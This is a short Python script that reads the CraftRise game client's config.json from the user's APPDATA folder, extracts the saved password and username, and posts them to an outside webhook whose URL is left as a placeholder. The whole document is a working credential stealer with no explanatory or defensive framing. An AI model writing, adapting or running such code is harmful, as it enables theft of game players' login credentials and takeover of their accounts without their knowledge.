import os
import requests
import json

with open(f"{os.getenv('APPDATA')}/.craftrise/config.json") as f:
    data = json.load(f)



url = "webhook here"


data2 = {"content":f"{data['rememberPass']}{data['rememberName']}"}
res = requests.post(url,json=data2)
